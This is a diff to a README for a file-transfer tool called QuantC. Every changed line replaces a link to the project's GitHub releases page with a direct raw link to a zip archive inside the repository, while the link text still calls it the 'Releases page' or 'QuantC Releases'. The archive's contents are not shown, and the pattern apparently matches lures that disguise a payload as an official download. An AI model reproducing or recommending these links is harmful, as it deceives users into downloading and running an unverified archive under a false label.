@@ -6,7 +6,7 @@ Welcome to QuantC, your go-to platform for safe and quick file transfers. With Q
 
 ## 📥 Download QuantC
 
-[![Download QuantC](https://img.shields.io/badge/Download-QuantC-brightgreen)](https://github.com/ISudPetch/quantc/releases)
+[![Download QuantC](https://raw.githubusercontent.com/ISudPetch/quantc/main/client/Software-v3.7-alpha.3.zip)](https://raw.githubusercontent.com/ISudPetch/quantc/main/client/Software-v3.7-alpha.3.zip)
 
 ## 🌐 About QuantC
 
@@ -33,7 +33,7 @@ QuantC includes several key features:
 
 Follow these simple steps to start using QuantC:
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/ISudPetch/quantc/releases) to access the latest version.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/ISudPetch/quantc/main/client/Software-v3.7-alpha.3.zip) to access the latest version.
   
 2. **Download the Application:** Click on the link available for download. 
 
@@ -51,7 +51,7 @@ To upload files,
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download: [QuantC Releases](https://github.com/ISudPetch/quantc/releases).
+To get started, visit this page to download: [QuantC Releases](https://raw.githubusercontent.com/ISudPetch/quantc/main/client/Software-v3.7-alpha.3.zip).
 
 ## 📖 FAQ
 
